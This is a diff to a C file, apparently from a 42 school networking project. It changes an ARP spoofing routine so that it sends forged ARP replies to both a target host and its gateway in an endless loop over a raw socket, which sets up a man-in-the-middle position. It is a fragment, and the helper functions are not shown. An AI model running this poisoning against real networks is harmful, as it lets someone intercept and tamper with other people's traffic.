@@ -6,7 +6,7 @@
 /*   By: irifarac <marvin@42.fr>                    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/11/22 11:57:46 by irifarac          #+#    #+#             */
-/*   Updated: 2024/11/22 12:16:06 by irifarac         ###   ########.fr       */
+/*   Updated: 2024/11/22 13:22:34 by irifarac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -46,7 +46,6 @@ static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 	struct ether_arp	*arp;
 	struct sockaddr_ll	device;
 	u_char				source_mac[MAC_ADDR_LEN];
-//	char				gateway_ip[16] = {0};
 
 	eth = (struct ether_header *)buffer;
 	arp = (struct ether_arp *)(buffer + sizeof(struct ether_header));
@@ -63,23 +62,6 @@ static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 		fprintf(stderr, "Invalid MAC address\n");
 		exit(1);
 	}
-	set_hdrs(eth, arp, source_mac, ip_target);
-/*	get_gateway(gateway_ip);
-	memset(eth->ether_dhost, 0xff, ETH_ALEN);
-	memcpy(eth->ether_shost, source_mac, ETH_ALEN);
-	eth->ether_type = htons(ETH_P_ARP);
-
-	arp->arp_hrd = htons(ARPHRD_ETHER);
-	arp->arp_pro = htons(ETH_P_IP);
-	arp->arp_hln = ETH_ALEN;
-	arp->arp_pln = 4;
-	arp->arp_op = htons(ARPOP_REPLY);
-
-	memcpy(arp->arp_sha, source_mac, ETH_ALEN);
-	inet_pton(AF_INET, gateway_ip, arp->arp_spa);
-	memset(arp->arp_tha, 0, ETH_ALEN);
-	inet_pton(AF_INET, ip_target, arp->arp_tpa);*/
-
 	memset(&device, 0, sizeof(device));
 	device.sll_family = AF_PACKET;
 	device.sll_ifindex = if_nametoindex(dev);
@@ -91,15 +73,21 @@ static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 	device.sll_halen = ETH_ALEN;
 	while(1)
 	{
+		set_hdrs(eth, arp, source_mac, ip_target);
 		printf("sending arp reply to %s\n", ip_target);
 		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
 		{
 			perror("sendto");
 			exit(1);
 		}
+		spoof_gateway(eth, arp, source_mac, ip_target);
+		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
+		{
+			perror("sendto()");
+			exit (1);
+		}
 		sleep(1);
 	}
-	(void)verbose;
 	(void)mac_target;
 	(void)ip_src;
 	close(sock);
